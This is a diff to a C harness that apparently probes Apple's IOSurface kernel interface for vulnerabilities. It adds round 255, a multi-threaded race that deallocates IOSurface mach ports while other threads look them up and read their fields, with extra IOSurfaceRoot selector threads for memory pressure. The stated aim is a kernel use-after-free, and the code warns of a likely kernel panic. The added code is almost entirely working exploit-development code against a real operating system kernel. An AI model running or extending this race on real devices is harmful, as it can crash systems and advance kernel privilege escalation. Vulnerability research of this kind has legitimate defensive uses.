@@ -1635,6 +1635,107 @@ static void *p13_render_loop(void *arg) {
     return NULL;
 }
 
+/* r255: mach port race UAF — create IOSurface, get port, free surface, race port dealloc */
+static volatile int r255_run = 0;
+static volatile int r255_created = 0;
+static volatile int r255_lookup_ok = 0;
+static volatile int r255_lookup_fail = 0;
+static volatile int r255_uaf_check = 0;
+
+struct r255_slot {
+    volatile mach_port_t port;
+    volatile IOSurfaceID sid;
+    volatile int state; /* 0=empty, 1=port_ready, 2=freed */
+};
+#define R255_SLOTS 64
+static struct r255_slot r255_slots[R255_SLOTS];
+
+static void *r255_producer(void *arg) {
+    (void)arg;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = w * bpe;
+    int pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    int idx = 0;
+    while (r255_run) {
+        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
+        if (s->state != 0) { idx++; sched_yield(); continue; }
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        if (!surf) continue;
+        IOSurfaceID sid = IOSurfaceGetID(surf);
+        mach_port_t port = IOSurfaceCreateMachPort(surf);
+        /* Release the userspace IOSurface ref — kernel still holds via mach port */
+        CFRelease(surf);
+        __sync_fetch_and_add(&r255_created, 1);
+
+        s->port = port;
+        s->sid = sid;
+        __sync_synchronize();
+        s->state = 1; /* Signal consumers */
+        idx++;
+    }
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+    CFRelease(props);
+    return NULL;
+}
+
+static void *r255_consumer(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    int idx = tid; /* Start at different offsets */
+    while (r255_run) {
+        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
+        if (s->state != 1) { idx += 2; sched_yield(); continue; }
+
+        mach_port_t port = s->port;
+        /* Race: lookup from port while another thread may be deallocating it */
+        IOSurfaceRef found = IOSurfaceLookupFromMachPort(port);
+        if (found) {
+            /* Access the surface to force kernel to dereference internal fields */
+            IOSurfaceGetWidth(found);
+            IOSurfaceGetAllocSize(found);
+            IOSurfaceIsInUse(found);
+            __sync_fetch_and_add(&r255_lookup_ok, 1);
+            CFRelease(found);
+        } else {
+            __sync_fetch_and_add(&r255_lookup_fail, 1);
+        }
+        idx += 2;
+    }
+    return NULL;
+}
+
+static void *r255_destroyer(void *arg) {
+    (void)arg;
+    int idx = 0;
+    while (r255_run) {
+        struct r255_slot *s = &r255_slots[idx % R255_SLOTS];
+        if (s->state != 1) { idx++; sched_yield(); continue; }
+
+        mach_port_t port = s->port;
+        s->state = 2;
+        /* Deallocate the mach port — drops kernel IOSurface ref.
+           If a consumer is mid-lookup, the kernel may access freed memory. */
+        mach_port_deallocate(mach_task_self(), port);
+        __sync_fetch_and_add(&r255_uaf_check, 1);
+        /* Mark slot as reusable */
+        s->state = 0;
+        idx++;
+    }
+    return NULL;
+}
+
 /* r254: encode-and-release UAF — push frames through hardware encoder, free immediately */
 static volatile int r254_run = 0;
 static volatile int r254_submitted = 0;
@@ -19844,6 +19945,81 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 255) {
+            rlog("*** rounds=255: Mach port race UAF ***\n");
+            rlog("  Producer: create IOSurface → get mach port → release surface\n");
+            rlog("  Consumer: IOSurfaceLookupFromMachPort → access fields\n");
+            rlog("  Destroyer: mach_port_deallocate → drops kernel ref\n");
+            rlog("  Race: consumer accessing surface while destroyer drops last ref\n\n");
+
+            char r255_sp[256];
+            { char *h = getenv("HOME"); snprintf(r255_sp, sizeof(r255_sp), "%s/Documents/uaf255_state.bin", h?h:"/tmp"); }
+            int r255_att = 0;
+            { FILE *f = fopen(r255_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0255) fread(&r255_att,4,1,f); fclose(f); } }
+            r255_att++;
+            rlog("  Attempt #%d\n", r255_att);
+            { FILE *f = fopen(r255_sp, "wb"); if (f) { uint32_t m=0xDEAD0255; fwrite(&m,4,1,f); fwrite(&r255_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r255_secs = 15;
+            if (argc > 3) r255_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds, %d ring slots\n", r255_secs, R255_SLOTS);
+            rlog("  >>> HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            memset((void*)r255_slots, 0, sizeof(r255_slots));
+            r255_run = 1;
+            r255_created = 0; r255_lookup_ok = 0; r255_lookup_fail = 0; r255_uaf_check = 0;
+
+            /* 1 producer, 2 consumers, 1 destroyer */
+            pthread_t r255_prod, r255_cons[2], r255_dest;
+            pthread_create(&r255_prod, NULL, r255_producer, NULL);
+            pthread_create(&r255_cons[0], NULL, r255_consumer, (void*)(uintptr_t)0);
+            pthread_create(&r255_cons[1], NULL, r255_consumer, (void*)(uintptr_t)1);
+            pthread_create(&r255_dest, NULL, r255_destroyer, NULL);
+
+            /* sel17/18 memory pressure */
+            io_service_t r255_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r255_conn = IO_OBJECT_NULL;
+            if (r255_svc) IOServiceOpen(r255_svc, mach_task_self(), 0, &r255_conn);
+            if (r255_conn) {
+                g_race250_conn = r255_conn;
+                g_race250_run = 1;
+                g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+                g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            }
+            pthread_t r255_t17, r255_t18;
+            if (r255_conn) {
+                pthread_create(&r255_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r255_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r255_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds created=%d lookup=%d/%d dealloc=%d reg=%d/%d\n", s+1,
+                     r255_created, r255_lookup_ok, r255_lookup_fail, r255_uaf_check,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r255_run = 0;
+            g_race250_run = 0;
+            pthread_join(r255_prod, NULL);
+            pthread_join(r255_cons[0], NULL);
+            pthread_join(r255_cons[1], NULL);
+            pthread_join(r255_dest, NULL);
+            if (r255_conn) {
+                pthread_join(r255_t17, NULL);
+                pthread_join(r255_t18, NULL);
+                IOServiceClose(r255_conn);
+                IOObjectRelease(r255_svc);
+            }
+
+            rlog("\n  === SURVIVED mach port race! ===\n");
+            rlog("  Total: created=%d lookup=%d/%d dealloc=%d\n",
+                 r255_created, r255_lookup_ok, r255_lookup_fail, r255_uaf_check);
+            rlog("*** r=255 complete ***\n");
             goto done;
         }
         if (rounds == 254) {
